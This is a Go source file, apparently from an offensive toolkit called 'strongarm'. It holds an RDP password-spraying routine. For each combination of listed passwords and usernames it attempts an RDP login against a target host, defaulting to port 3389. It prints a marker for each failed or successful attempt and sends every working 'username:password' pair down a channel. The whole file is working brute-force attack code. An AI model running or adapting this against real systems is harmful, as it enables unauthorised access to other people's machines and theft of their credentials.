package main

import (
	"fmt"
	"sync"

	"github.com/whiterabb17/strongarm/library/grdp"
	"github.com/whiterabb17/strongarm/library/grdp/glog"
	"github.com/whiterabb17/strongarm/library/grdp/protocol/pdu"
	"github.com/whiterabb17/strongarm/library/grdp/protocol/sec"
	"github.com/whiterabb17/strongarm/library/grdp/protocol/t125"
	"github.com/whiterabb17/strongarm/library/grdp/protocol/tpkt"
	"github.com/whiterabb17/strongarm/library/grdp/protocol/x224"
)

type Client struct {
	Host string // ip:port
	tpkt *tpkt.TPKT
	x224 *x224.X224
	mcs  *t125.MCSClient
	sec  *sec.Client
	pdu  *pdu.Client
}

func rdpSpray(wg *sync.WaitGroup, channelToCommunicate chan string, taskToRun task, storeResult *int) {
	defer wg.Done()
	internalCounter := 0
	if taskToRun.target.port == 0 {
		taskToRun.target.port = 3389
	}
	for _, password := range taskToRun.passwords {
		for _, username := range taskToRun.usernames {
			if internalCounter >= *storeResult {
				client := grdp.NewClient(stringifyTarget(taskToRun.target), glog.NONE)
				var err error
				err = client.LoginForSSL(".", username, password)
				if err != nil {
					fmt.Print("-")
				} else {
					fmt.Print("+")
					channelToCommunicate <- username + ":" + password
				}
				*storeResult++
			} else {
			}
			internalCounter++
		}
	}
}
